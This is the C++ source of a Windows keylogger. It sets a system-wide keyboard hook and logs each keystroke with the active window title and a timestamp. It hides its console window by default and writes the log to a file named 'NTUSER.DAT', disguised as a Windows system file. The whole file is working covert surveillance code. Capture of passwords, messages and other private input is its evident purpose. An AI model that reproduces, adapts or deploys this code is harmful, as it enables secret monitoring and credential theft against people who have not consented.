#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>

#define invisible

HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream OUTPUT_FILE;

extern char lastwindow[256];
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			Save(kbdStruct.vkCode);
		}
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    char lastwindow[256];

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks

	HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout;
    if (foreground) {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);

        if(strcmp(window_title, lastwindow)!=0) {
            strcpy(lastwindow, window_title);

            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);

            OUTPUT_FILE << "\n\n[Window: "<< window_title << " - at " << s << "] ";
        }
    }


	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
        OUTPUT_FILE << "[BACKSPACE]";
	else if (key_stroke == VK_RETURN)
		OUTPUT_FILE <<  "\n";
	else if (key_stroke == VK_SPACE)
		OUTPUT_FILE << " ";
	else if (key_stroke == VK_TAB)
		OUTPUT_FILE << "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		OUTPUT_FILE << "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		OUTPUT_FILE << "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		OUTPUT_FILE << "[ESCAPE]";
	else if (key_stroke == VK_END)
		OUTPUT_FILE << "[END]";
	else if (key_stroke == VK_HOME)
		OUTPUT_FILE << "[HOME]";
	else if (key_stroke == VK_LEFT)
		OUTPUT_FILE << "[LEFT]";
	else if (key_stroke == VK_UP)
		OUTPUT_FILE << "[UP]";
	else if (key_stroke == VK_RIGHT)
		OUTPUT_FILE << "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		OUTPUT_FILE << "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		OUTPUT_FILE << ".";
	else if (key_stroke == 189 || key_stroke == 109)
		OUTPUT_FILE << "-";
	else if (key_stroke == 20)
		OUTPUT_FILE << "[CAPSLOCK]";
	else {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;
        }
        key = MapVirtualKeyExA(key_stroke, 2, layout);

        if (!lowercase) key = tolower(key);
		OUTPUT_FILE <<  char(key);
    }
    OUTPUT_FILE.flush();
	return 0;
}

void Stealth()
{
	#ifdef visible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
	#endif

	#ifdef invisible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
	#endif
}

int main()
{
    OUTPUT_FILE.open("NTUSER.DAT",std::ios_base::app);

	Stealth();
	SetHook();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}